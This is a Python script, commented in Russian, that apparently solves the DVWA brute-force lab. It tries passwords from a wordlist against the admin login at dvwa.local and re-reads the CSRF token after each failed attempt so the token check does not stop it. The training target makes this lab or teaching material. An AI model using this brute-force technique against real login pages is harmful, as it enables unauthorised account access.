import requests # позволяет легко отправлять запросы HTTP
from bs4 import BeautifulSoup as Soup # библиотека для извлечения данных из файлов HTML и XML

filename = 'passwords.txt' # файл с паролями
success_message = 'Welcome to the password protected area admin'
txt = open(filename)
url = 'http://dvwa.local/vulnerabilities/brute/index.php'

cookie = {'security': 'high', 'PHPSESSID': 'mlmi3nuh5pboft6bqpraql6aqr'} # куки нужны для входа на страницу задания bruteforce (иначе выкинет)
s = requests.Session() # Объект Session позволяет сохранять определенные параметры между запросами. Он также сохраняет файлы cookie для всех запросов, сделанных из экземпляра Session
target_page = s.get(url, cookies=cookie) #отправляем get-запрос


def checkSuccess(html):
    soup = Soup(html, 'html.parser') #парсим страницу
    search = soup.findAll(text=success_message) #ищем сообщение, что нам удалось войти

    if not search:
        success = False
    else:
        success = True
    return success


page_source = target_page.text
soup = Soup(page_source, 'html.parser')
csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value') #вылавливаем значение csrf-токена через findAll. Поиск всех совпадений в строке.
with open(filename) as f:
    print('Begin...')
    for password in f:
        payload = {'username': 'admin', 'password': password.rstrip('\r\n'), 'Login': 'Login', 'user_token': csrf_token}
        r = s.get(url, cookies=cookie, params=payload) # отправляет запрос GET на указанный URL-адрес.
        success = checkSuccess(r.text)
        if not success:
            soup = Soup(r.text, 'html.parser')
            csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
        else:
            print('Password = : ' + password)
            break
    if not success:
        print('Failed')

